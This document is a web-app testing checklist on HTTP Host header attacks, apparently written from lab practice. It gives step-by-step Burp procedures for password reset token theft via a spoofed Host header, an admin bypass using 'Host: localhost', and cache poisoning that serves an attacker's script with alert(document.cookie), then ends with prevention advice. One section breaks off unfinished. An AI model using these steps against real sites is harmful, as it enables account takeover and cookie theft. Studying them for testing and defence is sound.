# Web-app-testing-list

## HTTP Host header attacks =======================================  
We visit https://example.com/security, browser will compose a request containing a Host header:
> GET /security HTTP/1.1  
> Host: example.com  

The purpose of the HTTP Host header is to help identify which back-end component the client wants to communicate with and route request to right application.  
* Possible scenario is when a single web server hosts multiple websites or applications.
* When websites are hosted on distinct back-end servers and all traffic between the client and servers is routed through an intermediary system like load balancer or  reverse proxy server (they need to know on which back-end server to route requests). This setup is especially prevalent in cases where clients access the website via a content delivery network (CDN).

Problem is when server implicitly trusts the Host: header, and fails to validate or escape it properly  

### Password reset poisoning
Changing header Host: from legit to our malicious domain to obtain password reset link which include the unique reset token.   
1.) In Burp "POST /forgot-password" request body change the username parameter and change the Host: header to your exploit server's domain name  
2.) In malicious servers access.log obtain reset token  
3.) In Burp use our acc genuine password reset link from email, but change token parametre in URL.  
>/forgot-password?temp-forgot-password-token=S0j4fkc7y9M9AgAPXu8kDsNG1pT9kPZ4    

### Host header authentication bypass - change "Host: localhost"
If we can change Host: header to any value and still successfully access the home page.  
1.) robots.txt includes an /admin.  
2.) We cant access /admin, theres error message "Admin interface only available to local users"  
3.) In Burp change Host: header to localhost  
> Host: localhost  

### Web cache poisoning via Host: header
To reduce latency cache sits between the back-end server and the user where it saves (caches) the responses to particular requests, usually for a fixed amount of time. If another user sends equivalent request, cache simply serves a copy of the cached response w/o interfering with back-end server.
If an input is reflected in the response from the server without being properly sanitized, or is used to dynamically generate other data, then this is a potential entry point for web cache poisoning. Next step is to make cache server to save our malicious request! 

1.) GET request response with Cache header, also tampering with Host: header doesnt load website.
> Cache-Control: max-age=30  
> X-Cache: miss  

2.) Identifying unkeyed inputs that server supports with Burp Comparer or Param Miner (on live website, risk is that cache might serve our generated responses to real users, therefore make sure that our requests all have a unique cache key so that they will only be served to you.). Host: header is parameter in this case.  
3.) Add second Host: header and send 
>Host: test.test.com   

Response contains our test code in: "<script type="text/javascript" src="//test.test2.com/resources/js/tracking.js"></script>" and X-Cache: miss, send again till get X-Cache: hit, means its saved in cache for 30sec!:
> X-Cache: miss  
> EX-Cache: hit  

4.) Create malicious domain where store your exploit.
Back in Burp Repeater, add a second Host header containing your exploit server domain name

> GET /?cb=123 HTTP/1.1  # "?cb=123" is random, used as unique cache key that we know  
> Host: realwebsite.net  
> Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net  

Exploit file: /resources/js/tracking.js and body alert(document.cookie)

### Routing-based SSRF - Host header SSRF attacks

Cloud-based architectures, load balancers and reverse proxies receive requests and forward them to the appropriate back-end. If they are insecurely configured to forward requests based on an unvalidated Host header, they can be manipulated into misrouting requests.

### Host validation bypass via connection state attack
Poorly implemented HTTP server settings state that Host: header, are identical for all HTTP/1.1 requests. Or servers that only perform thorough validation on the first request they receive over a new connection. In this case, you can potentially bypass this validation by sending an innocent-looking initial request then following up with your malicious one down the same connection.

We know that ar ip 192.168.0.1 is located /admin panel  
1.) 



### Routing-based SSRF - Host header SSRF attacks

----------------------
How to prevent HTTP Host header attacks
To prevent HTTP Host header attacks, the simplest approach is to avoid using the Host header altogether in server-side code. Double-check whether each URL really needs to be absolute. You will often find that you can just use a relative URL instead. This simple change can help you prevent web cache poisoning vulnerabilities in particular.

### Prevent HTTP Host header attacks:

Protect absolute URLs
When you have to use absolute URLs, you should require the current domain to be manually specified in a configuration file and refer to this value instead of the Host header. This approach would eliminate the threat of password reset poisoning, for example.

Validate the Host header
If you must use the Host header, make sure you validate it properly. This should involve checking it against a whitelist of permitted domains and rejecting or redirecting any requests for unrecognized hosts. You should consult the documentation of your framework for guidance on how to do this. For example, the Django framework provides the ALLOWED_HOSTS option in the settings file. This approach will reduce your exposure to Host header injection attacks.

Don't support Host override headers
It is also important to check that you do not support additional headers that may be used to construct these attacks, in particular X-Forwarded-Host. Remember that these may be supported by default.

Whitelist permitted domains
To prevent routing-based attacks on internal infrastructure, you should configure your load balancer or any reverse proxies to forward requests only to a whitelist of permitted domains.

Be careful with internal-only virtual hosts
When using virtual hosting, you should avoid hosting internal-only websites and applications on the same server as public-facing content. Otherwise, attackers may be able to access internal domains via Host header manipulation.




















































